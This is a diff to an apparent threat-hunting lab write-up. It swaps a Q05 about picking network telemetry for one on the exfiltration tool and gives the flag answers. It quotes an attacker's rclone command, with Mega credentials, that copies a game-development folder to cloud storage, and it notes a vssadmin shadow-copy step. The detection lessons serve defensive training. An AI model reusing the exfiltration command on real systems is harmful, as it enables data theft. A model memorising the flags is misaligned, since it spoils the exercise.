@@ -261,17 +261,23 @@ The attacker created a VSS shadow copy (vssadmin create shadow /For=C:) to bypas
 </details>
 
 <details>
-<summary>Q05 — Evidence Source Selection</summary>
+<summary>Q05 — Exfil Tool</summary>
 
-**Goal:** Identify the correct telemetry source to determine if the exposed public IP was scanned or enumerated.
+**Goal:** Identify the tool used to exfiltrate the stolen data.
 
-**Approach:** This is a conceptual question about choosing the right data source. The scenario is that a VM's public IP was exposed. To detect scanning/enumeration activity, you need network-layer events — inbound connection attempts, port probes, and reconnaissance traffic. This rules out application-layer logs (event logs, browser history), identity-layer logs (sign-in logs), and inventory systems (MDE device lists). Only network telemetry captures the initial knock on the door.
+**Approach:** No additional query needed. The exfil tool was already visible in the Q02 results. The rclone command captured on the server showed the full binary path and execution context.
 
-The correct table for this is `DeviceNetworkEvents` — Sysmon's network connection logging. This logs `ConnectionAttempt`, `InboundConnectionAccepted`, and other connection state changes at the network plane, which is exactly what you need to detect scanning and enumeration activity against a public-facing asset.
+From the Q02 rclone command:
 
-**Flag:** `DeviceNetworkEvents`
+```
+C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
+```
 
-> **Lesson:** Pick telemetry by the layer of activity you're hunting. Authentication attempts live in logon events. Process execution lives in process creation tables. File access lives in file event logs. But if you're hunting "did anyone knock on the door," that's a network-layer question answered only by network tables. When the hypothesis is "exposure was discovered," the network table is always the first stop — successful auth and post-exploitation only matter once you've confirmed someone was looking.
+The binary is `rclone.exe`, staged by the attacker in `C:\Users\Public\` — a world-writable directory that requires no elevated privileges to write to.
+
+**Flag:** `rclone.exe`
+
+> **Lesson:** Attackers favor C:\Users\Public\ as a staging directory because any user or process can write there without triggering UAC. When hunting for attacker-dropped tools, always check Public alongside Temp directories. Rclone is a legitimate open-source cloud sync tool, which also means it won't trigger AV on signature alone — defenders need behavioral detection (unusual process making outbound connections to cloud storage) rather than relying on file reputation.
 
 </details>
 
